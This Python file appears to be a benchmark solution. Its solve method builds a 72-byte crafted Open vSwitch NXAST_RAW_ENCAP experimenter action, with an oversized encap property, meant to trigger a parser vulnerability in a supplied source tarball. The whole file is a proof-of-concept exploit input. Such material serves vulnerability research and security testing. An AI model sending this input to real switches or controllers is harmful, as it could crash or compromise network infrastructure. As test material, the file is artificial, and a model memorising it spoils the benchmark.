import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # PoC structure:
        # - nx_action_encap header (16 bytes)
        # - ofp_encap_prop (52 bytes)
        # - padding (4 bytes)
        # Total = 72 bytes

        # All values are in big-endian byte order.

        # nx_action_encap header (16 bytes)
        action_type = 0xffff  # OFPAT_EXPERIMENTER
        action_len = 72       # Total length of the action
        vendor = 0x00002320   # NX_VENDOR_ID
        subtype = 38          # NXAST_RAW_ENCAP
        flags = 0
        props_len = 52        # Length of the properties section
        pad = 0               # 2-byte padding within the struct

        # Pack the header using '>' for big-endian.
        # Format corresponds to: u_short, u_short, u_int, u_short, u_short, u_short, u_short
        header = struct.pack('>HH I HHH H',
                             action_type,
                             action_len,
                             vendor,
                             subtype,
                             flags,
                             props_len,
                             pad)

        # ofp_encap_prop (52 bytes)
        # Consists of a 4-byte header and 48 bytes of payload.
        prop_type = 0         # OFPPPT_BASIC
        prop_len = 52         # Total length of the property

        prop_header = struct.pack('>HH', prop_type, prop_len)
        prop_payload = b'\x00' * 48
        property_part = prop_header + prop_payload

        # Padding (4 bytes)
        # Total length so far is 16 (header) + 52 (property) = 68.
        # We need 4 bytes of padding to reach the total action length of 72.
        padding = b'\x00' * 4

        # Assemble the final PoC
        poc = header + property_part + padding
        
        return poc